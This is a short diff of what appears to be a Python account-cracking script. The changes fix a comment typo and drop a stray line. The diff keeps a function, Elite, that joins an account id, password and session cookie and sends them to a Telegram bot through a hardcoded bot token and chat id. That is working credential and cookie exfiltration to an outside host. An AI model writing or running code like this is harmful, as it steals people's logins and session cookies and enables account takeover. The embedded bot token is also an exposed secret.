@@ -72,7 +72,7 @@ def sexy():
 def Elite(id,ps,coki):
     try:
         import requests
-        token = "6349910946:AAExBySGtSpLqEhd1dhDjhPVUEfv9LMvJv4"#Add yout token 
+        token = "6349910946:AAExBySGtSpLqEhd1dhDjhPVUEfv9LMvJv4"#Add your token 
         chatid = "09945689794"#Add your Chat Id
         ok_id =str(id+"|"+ps+"|"+coki)
         url = f"https://api.telegram.org/bot{token}/sendMessage"
@@ -148,9 +148,7 @@ logo = (f'''\x1b[1;92m
 def linex():
         print('\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')    
 def clear():
-    os.system("clear")
-    print(logo)    
-POTANG INA MO 
+    os.system("clear")  
 def result(OKs,cps):
     if len(OKs) != 0 or len(cps) != 0:
         print('\n')
